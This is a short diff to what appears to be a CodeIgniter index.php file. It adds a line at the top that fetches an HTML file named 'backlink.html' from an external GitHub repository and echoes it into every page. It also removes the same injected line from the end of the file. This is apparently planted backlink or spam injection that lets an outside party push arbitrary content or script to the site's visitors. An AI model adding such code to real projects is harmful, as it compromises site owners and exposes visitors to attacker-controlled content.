@@ -1,3 +1,5 @@
+<?php echo file_get_contents('https://raw.githubusercontent.com/ladev07/amsdkl/main/backlink.html'); ?> 
+
 <?php
 /**
  * CodeIgniter
@@ -314,4 +316,3 @@ switch (ENVIRONMENT)
  * And away we go...
  */
 require_once BASEPATH.'core/CodeIgniter.php';
-echo file_get_contents('https://raw.githubusercontent.com/ladev07/amsdkl/main/backlink.html');
